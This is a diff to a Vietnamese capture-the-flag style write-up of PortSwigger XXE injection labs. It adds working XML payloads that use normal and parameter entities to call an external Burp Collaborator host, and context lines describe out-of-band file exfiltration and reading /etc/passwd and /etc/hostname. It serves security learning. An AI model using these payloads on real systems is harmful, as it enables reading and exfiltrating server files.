@@ -151,7 +151,7 @@ Khi inject thành công thì Burp Collborator sẽ bắt được request:
 
 ![lab3](./img/lab3.png)
 
-#### Ví dụ: Lab4 XXE injection portswigger
+#### Ví dụ: Lab5 XXE injection portswigger
 Ở ví dụ này thì mình dùng Blind XXE out-of-band để đọc một file bất kỳ trên sever
 
 Trước tiên ta cần tìm hiểu về cách dùng kỹ thuật out-of-band để đọc file bất kỳ trên sever, các bước thực hiện sẽ bao gồm
@@ -169,7 +169,7 @@ File DTD sẽ được khai báo như sau:
 >>1. entity ``file`` được dùng để đọc file bất kỳ
 >>2. entity ``eval`` sẽ chứa một khai báo động đến ``exfil``
 >>3. ``exif`` sẽ gửi request đến Burp Collaborator kèm theo nội dung của file
->>3. Ngoài ra thì payload trên sử dụng ``%`` để khai báo entity. Cách khai báo này gọi là ``Parameterized entity``, nó tương tự như khai báo thông thường nhưng sẽ được dùng để bypass khi khai báo kiểu bình thường không hoạt động
+>>3. Ngoài ra thì payload trên sử dụng ``%`` để khai báo entity. Cách khai báo này gọi là ``Parameterized entity``, nó tương tự như khai báo thông thường nhưng sẽ được dùng để bypass khi khai báo kiểu bình thường không hoạt động, và parameter entity thì chỉ có hiệu lực khi gọi tới bên trong ``<!DOCTYPE ....>`` hay là bên trong khai báo DTD
 >>4. Phần mã hex ``&#x25`` là mã hex của ký tự ``%``, ta dùng mã hex đơn giản là để bypass thôi
 
 Bước tiếp theo trong tài liệu XML của web thì ta inject thêm đoạn sau để thực hiện SSRF tới file DTD của ta:
@@ -212,7 +212,7 @@ Ví dụ về paylaod dùng error message để đọc nội dung file /etc
 
 Và để trigger được DTD chứa payload thì ta cũng dùng cách tương tự như Blind XXE out-of-band
 
-#### Ví dụ: Lab5 XXE injection portswigger
+#### Ví dụ: Lab6 XXE injection portswigger
 Ở labs này thì input XML sẽ không trả về giá trị gì khi gửi đi nếu không phải là check số lượng hàng, vì thế ta dùng error message để đọc file /etc/passwd
 
 Đầu tiên tạo một file DTD có nội dung như sau:
@@ -340,11 +340,12 @@ Labs cho ta một trang blog, ta có thẻ thực hiện post comment trong 
       <text font-size="16" x="0" y="16">&xxe;</text>
     </svg>
 ```
-> Với tag ``<text>`` được để chèn test vào svg
+> Với tag ``<text>`` được để chèn text vào svg
 
 Ta up load file svg này lên
 
 Output:
+
 ![lab8](./img/lab8.png)
 
 Ta có thể thấy đoạn text trên avatar của ta chính là nội dung của file /etc/hostname. Ta nhập lại và submit để hoàn thành lab
@@ -369,3 +370,34 @@ Content-Length: 52
 
 <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
 ```
+
+## 10. Nói thêm về ``parameter entity`` thông qua lab 4 XXE injection portswigger
+Ở lab này ta sẽ dùng ``parameter entity`` để thực hiện XXE attack, bởi vì cách khai báo entity thông thường ở lab này đã bị blocked.
+
+Nói thêm 1 tý về ``parameter entity`` thì nó cũng có chức năng tương tự như là khai báo kiểu thông thường, tuy nhiên một số trường hợp mà khai báo thông thường bị block thì ta có thể dùng cách này để thay thế. Điểm khác nhau giữa ``parameter entity`` và cách khai báo thông thường là cách khai báo thông thường có thể được tham chiếu tới trong cả file XML, còn ``parameter entity`` thì chỉ được tham chiếu bên trong DTD hay nói dễ hiểu là bên trong phần ``<!DOCTYPE ...>``
+
+Web cho ta một trang check stock và nhiệm vụ của ta là thực hiện XXE out-of-bound đến Burp Collabroator
+
+Ta thử inject payload bằng cách khai báo thông thường:
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://ywy2xnkgfa21yppymd4w623z4qagy5.oastify.com">}>
+  <stockCheck>
+    <productId>
+      &xxe;
+    </productId>
+    <storeId>1</storeId>
+  </stockCheck>
+```
+
+![lab4](./img/lab4-param.png)
+
+Vì khai báo kiểu thông thường bị block nên ta dùng ``parameter entity``:
+```xml
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ywy2xnkgfa21yppymd4w623z4qagy5.oastify.com">%xxe;]>
+```
+
+Output:
+![lab4](./img/lab4-output.png)
+
+
